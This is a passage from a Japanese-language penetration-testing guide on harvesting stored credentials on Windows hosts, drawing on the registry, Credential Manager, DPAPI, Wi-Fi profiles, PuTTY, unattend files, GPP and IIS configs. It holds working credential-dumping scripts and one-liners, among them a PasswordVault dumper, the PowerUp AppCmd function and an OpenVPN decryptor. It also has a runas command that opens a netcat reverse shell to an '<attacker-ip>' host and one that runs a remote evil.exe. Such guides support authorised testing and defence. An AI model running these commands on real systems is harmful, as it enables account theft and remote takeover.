reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱います。`DefaultPassword` または `AltDefaultPassword` に空でない値が設定されている場合は、平文のレジストリ上の情報として検出できます。`AutoAdminLogon=1` で平文パスワードを読み取れない場合は、手がかりにとどまります。[Sysinternals Autologon はパスワードを LSA secret として保存する場合があります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の漏えいとして報告する前に、アクセス権と実際のログオン設定を確認してください。

### Credentials manager / Windows vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> より\
Windows Vault は、**Windows** が**ユーザーを自動的にログインさせる**ために使用できる、サーバー、Webサイト、その他のプログラム用のユーザー認証情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーに自動ログインさせる機能のように聞こえるかもしれませんが、そうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための認証情報を保存します。つまり、リソース（サーバーまたはWebサイト）へのアクセスに認証情報が必要な**Windowsアプリケーションは、Credential Manager と Windows Vault を利用**し、毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を使うことはできないと思います。そのため、アプリケーションで vault を利用するには、何らかの方法で**Credential Manager と通信し、既定の保存先 vault からそのリソース用の認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。次の例では、SMB共有経由でリモートバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報で`runas`を使用する

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)を使用する方法もあります。

### UWP PasswordVault / Credential Locker

最新のWindows UWPアプリケーション、Microsoft Edge、最新のシステムサービスは、認証トークンと平文パスワードを、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）内に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や`SeDebugPrivilege`なしで、ネイティブに復号できます。

ユーザーのアクティブなセッション内で次のPowerShellコマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にdumpして復号できます：

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化するための方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

**DPAPI は、ユーザーのログインシークレットから導出した対称鍵を使って鍵を暗号化できます**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じファイル内にあり、ユーザーの秘密鍵を保護するマスター鍵とともに保存されている DPAPI 鍵**は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

適切な引数（`/pvk` または `/rpc`）を指定して、**mimikatz module** `dpapi::masterkey` を使用すれば、復号できます。

**master passwordで保護されたcredentials files** は、通常次の場所にあります：

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使用して復号できます。\
**root** 権限がある場合は、`sekurlsa::dpapi` module を使用して、**memory** から多数の DPAPI **masterkeys** を**抽出**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 認証情報

**PowerShell 認証情報**は、**スクリプト**や自動化タスクで、暗号化された認証情報を便利に保存する方法としてよく使用されます。認証情報は **DPAPI** で保護されているため、通常は作成したユーザーが同じコンピューター上でのみ復号できます。

エクスポートされた認証情報のファイル名や `.xml` パスは任意です。スクリプトやファイルの一覧から該当ファイルを特定した場合は、`C:\Users` にあると決めつけず、アカウントの実際のプロファイルディレクトリを確認してください。[Windows ではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルが読み取れることは手掛かりにすぎません。[Windows の `Export-Clixml` は、暗号化された認証情報をエクスポート元のユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントが対象サービスで有効な権限を持つことも別途確認する必要があります。通常の調査では、暗号化された値や平文の値を出力せずに、まずパスと ACL を確認してください。

ファイルに含まれる PS 認証情報を**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers` にあります。

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**.rdg files を復号**します\
Mimikatz の `sekurlsa::dpapi` module を使用すると、メモリから多数の DPAPI masterkeys を**抽出**できます

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents 内にある、`config.xml` などの一般的な名前のファイルを含む、読み取り可能な XML を調べてください。XML ファイルを認証情報の手掛かりとみなす前に、接続スキーマと暗号化された `Password` attributes を特定してください。保存値は DPAPI/RDCMan password ではありません。復元できるかどうかはファイルの暗号化設定と、カスタム master password が使用されたかどうかによって異なります。広範な列挙中に暗号化された値を表示しないでください。

**Remote Desktop Plus profile exports** も、ユーザーディレクトリまたは共有の管理フォルダー内に読み取り可能な状態で保存されていることがあります。レガシーな `profiles.xml` export には、`ProfileName`、`Password`、`Secure` elements を含む `Data/Profile` entries があります。空でない password element は、表示したり平文と決めつけたりせず、認証情報の手掛かりとして扱ってください。[vendor の説明](https://www.donkz.nl/)によると、profile の保護は作成時のアカウントとコンピューターに紐付けられている場合も、より緩い設定の場合もあります。これを頼りにする前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Windows ワークステーションでは、データベースファイルだと気づかずに、StickyNotes app に**パスワード**やその他の情報を保存していることがよくあります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、検索して調べる価値があります。

Sticky Notes applications にパスワードやその他の情報を保存する人もいます。Microsoft の packaged Sticky Notes app は通常、`C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にメモを保存します。古い app や別の app では、LevelDB など、ユーザープロファイル内の別のストアを使用する場合があります。SQLite ファイルが見つからないことをメモがない証拠とみなす前に、インストールされている app とストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近 commit されたメモが含まれないことがあります。データベースの整合性が取れたコピーとともに、対応する `plum.sqlite-wal` も保持し、利用できる場合は `plum.sqlite-shm` も含めてください。共有メモリの index は再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL documentation](https://www.sqlite.org/wal.html) を参照してください。アカウント名やパスワードを含むメモは、認証情報の手掛かりにすぎません。アカウントと許可されたアクセスを確認し、パスワードの使い回しは別途検証してください。暗号化された password-manager record を、より高い権限のログインに利用できると判断するには、実際の復号キーと app 固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity level で実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、**認証情報**が設定されており、**復元できる**可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行されます。多くは** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)** の情報によると、**DLL Sideloading に対して脆弱です。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

一部の古いリモートサポート製品のインストール環境では、固定のアプリケーションレジストリキー配下にパスワード関連の値名が残っています。たとえば、[vendor's registry-key explanation](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、バージョン9より前のTeamViewerでは、`SecurityPasswordAES`が設定済みの静的セッションパスワードを示していました。値名のマーカーは調査の手掛かりにすぎません。認証情報を評価する前に、インストール済みのバージョン、読み取り可能な値データ、その形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より権限の高いWindowsアカウントに至るには、実際にパスワードが再利用されており、そのアカウントへのアクセスが許可されている必要もあります。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウントデータが含まれている可能性がある場合は、**ファイル暗号化**と、ワークシートの保護や非表示の列を区別してください。[Microsoft states](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)によると、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけでは、ブックの内容が暗号化されているとは判断できません。許可された関連ファイルのみを確認し、広範な列挙中に候補となる秘密情報を出力しないでください。読み取り可能な`.xlsx`のパス、保護されたシート、または非表示の列だけでは、認証情報の存在や、いずれかのアカウントがより高い権限を持つことの証明にはなりません。実際のデータと現在のアカウント権限は、それぞれ別途確認してください。

### CIサーバーに保持された変更パッチ

CIサーバーは、ビルド完了後も、送信されたソース変更をデータディレクトリに保持している場合があります。[TeamCity documents](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)によると、`system/changes`はリモート実行の変更を保存する場所です。データディレクトリは設定可能であり、必ずしも`ProgramData`配下にあるとは限りません。読み取り可能なパッチには、認証情報ファイル、暗号化キー、またはその両方を使用するスクリプトへの参照が、削除または追加された状態で残っていることがあります。たとえば、PowerShellの`ConvertTo-SecureString -Key`ワークフローでは、暗号化文字列に加えてAESキーも必要です。[Microsoft documents](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)によると、キーは別途指定します。まずアクセス可能なパッチ名のみを確認し、その後、許可を得たうえで関連する内容を調べてください。通常の列挙出力に秘密情報を含めないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や高い権限でのアクセスが証明されるわけではありません。データディレクトリのACLを制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自開発のパスワードローテーターは、暗号化したローカル管理者パスワードをローカルサービスに保存する一方、データストアの認証情報を読み取り可能な`.env`ファイルやアップデーターのバイナリの隣に置くことがあります。アップデーターのスケジュールタスク、アカウント、設定ファイルのACL、リスナー、データストアの権限をあわせて確認してください。データストアがループバック専用でも、有効な認証情報を持つローカルユーザーからは到達可能です。ただし、認証を通過しただけでは、該当レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文の隣にアクセス可能な状態で置かれている場合は、暗号化を信用する前に、正確なキー導出方法を確認してください。公開されたシードからGoの[`math/rand`](https://pkg.go.dev/math/rand)を使ってAESキーを決定論的に導出する方式は、そのパスワードの保護には適しません。Goのドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には不適切とされています。復元したパスワードを権限昇格の経路とみなす前に、それが現在も有効であり、ローカルAdministratorsグループのアカウントに属することを確認してください。スケジュールタスク、`.env`のパス、暗号化されたデータだけでは、これらの条件は一つも証明されません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには[Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)を使用してください。ディレクトリまたはEntraを基盤とするストレージとアクセス制御は、カスタムのローカルデータストアとは異なります。同様に、[Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)は、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかを決定します。

### Javaサーバープラグインのアーカイブと認証情報の再利用

一部のJavaサーバープラグインは、サーバーの`plugins`ディレクトリにJARアーカイブとして配布されています。読み取り可能なカスタムプラグインには、サービス認証情報が埋め込まれた設定やバイトコードが含まれている場合があります。許可を得た場合に限りアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在は証明されず、復元したサービスパスワードがより権限の高いアカウントでも有効な場合に限り、より高い権限につながります。関連するファイルACLを確認し、再利用された認証情報は個別の秘密情報に置き換えてください。ディレクトリ構成については[PaperMC's plugin installation guide](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については[Oracle's JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfireの埋め込みデータベースの認証情報

埋め込みデータベースを使用するOpenfireのインストール環境では、`openfire.script`が`Openfire\embedded-db`配下に保存されている場合があります。現在のアカウントで読み取り可能なら、`OFUSER`レコードと`passwordKey`プロパティをあわせて確認してください。Openfireの[user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文、またはそのプロパティに保持されたキーで暗号化して保存できます。復元したパスワードが権限昇格に関係するのは、より権限の高いIDで現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスや認証情報の再利用は証明されません。このパスはインベントリ確認の手掛かりです。データベースの内容や認証情報を通常の列挙出力に含めないでください。

別のファイルである`Openfire\conf\openfire.xml`には、外部データベースを使用している場合でも、管理コンソールに設定されたポートやバインドインターフェースが記載されていることがあります。Openfireの管理コンソールは一般にループバックにバインドされますが、リスナーが稼働中なら、ローカルアカウントからそのアドレスに到達できます。実際のリスナー、許可されたadminロール、プラグインのアップロードポリシー、Openfireサービスの実行IDをあわせて確認してください。プラグインをインストールできるadminは、サービスのコンテキストでプラグインコードを実行させることができます。サービスがLocalSystemとして動作している場合、高い権限で実行される可能性があります。一致するアカウントパスワードや読み取り可能な設定パスだけでは、管理コンソールへのアクセスやコード実行は証明されません。ベンダーの[installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

一般に`server.config.yaml`という名前のVelociraptorサーバー設定には、内部CAの`CA.private_key`が含まれる場合があります。権限の低いユーザーがこのキーを読み取れる場合、APIクライアント証明書を発行できる可能性があります。これがより高い権限につながるかどうかは、サーバーのユーザーロール、APIへの到達性、サーバーまたは対象エージェントの実行IDによって異なります。クライアント設定には別の情報が含まれます。クライアント設定が見つかっても、サーバーCAへのアクセスがあるとは限りません。CA秘密鍵をオフラインで保管する環境もあるため、読み取り可能なサーバー設定にも署名キーがない場合があります。

Windowsサーバーでは、インストールディレクトリ内の**サーバー**設定ファイルと、保護されたバックアップのACLを確認してください。場所の例は`%ProgramFiles%\VelociraptorServer\server.config.yaml`です。異なる場合は、サービスに設定されたパスを使用してください。現在のIDでファイルを読み取れることと、`CA.private_key`が実際に含まれていることを確認してください。ログや列挙出力に秘密鍵を出力しないでください。ベンダーの`config api_client`ワークフローではCAキーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込みアクセスまたは再起動が必要になる場合があります。そうした書き込みができなくても、既存の特権サーバーIDが経路となる可能性があります。実行権限を持つAPIクエリは、関連するサーバーまたはエージェントのコンテキストで実行されるため、高い権限で動作することがあります。

サーバー設定とバックアップは制限的なACLで保護し、可能な場合はCA署名キーをオフラインで保管し、APIロールとリスナーへのアクセスを制限してください。[Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/)と[security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Puttyの認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY は独立したセッションマネージャーです。ネイティブの暗号化ストアは `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` にある場合があり、エクスポートされたセッションのバックアップは `sessions-backup.dat` という名前で別の場所に保存されている場合があります。[SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) によると、エクスポートデータはパスワードで暗号化され、セッション、キー、スクリプト、タグ、および関連付けを含む場合があります。また、[support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) ではネイティブストアの場所が示されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルが見つかっても、そのパスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### PuTTY SSH ホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内のSSH keys

SSH private keysはレジストリキー`HKCU\Software\OpenSSH\Agent\Keys`内に保存されることがあるため、興味深い情報がないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内に何かエントリが見つかった場合、おそらく保存された SSH key です。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動的に開始させたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。SSHキーを作成して`ssh-add`で追加し、SSH経由でマシンにログインしてみましたが、レジストリのHKCU\Software\OpenSSH\Agent\Keysは存在せず、procmonでも非対称鍵認証中に`dpapi.dll`が使用されていることを確認できませんでした。

### 自動インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは、**metasploit**を使って _post/windows/gather/enum_unattend_ から検索することもできます。

例の内容:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM と SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。ローカルからアクセスできるバックアップディレクトリやイメージディレクトリを優先し、抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが公開されている証拠にはならず、一般的な `install.wim`、`boot.wim`、リカバリーイメージは誤検知につながりやすいものです。SMB share は別のアクセス経路であり、その share がスコープ内にある場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences (GPP) を使用して、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL に XML ファイルとして保存された Group Policy Objects (GPO) に、ドメインユーザーなら誰でもアクセスできました。第二に、GPP 内のパスワードは、公開されているデフォルトキーを使用して AES256 で暗号化されていましたが、認証済みユーザーなら誰でも復号できました。これにより、ユーザーが昇格した権限を取得する深刻なリスクが生じていました。

このリスクを軽減するため、空ではない「cpassword」フィールドを含む、ローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。そのようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP とファイルの場所に関する情報が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

これらのファイルを検索します: `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista より前)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例：

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

配信対象の webroot に古い ZIP バックアップが直接置かれていると、以前の設定ファイルや再利用可能な認証情報が漏えいする可能性があります。公開されていると判断する前に、サイトに設定された物理パスと、アーカイブに HTTP 経由で実際にアクセスできるかを確認してください。デフォルトの `C:\inetpub\wwwroot` は候補の1つにすぎません。簡単なローカル調査では、アーカイブを開かずに名前とサイズを一覧表示できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、秘密情報が含まれていることも、見つかった認証情報でより高い権限を得られることも証明できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

ユーザーが知っている可能性があると思うなら、**ユーザーに認証情報、あるいは別のユーザーの認証情報を入力するよういつでも尋ねる**ことができます（ただし、クライアントに直接**認証情報**を尋ねるのは非常に**リスクが高い**ことに注意してください）。

```bash
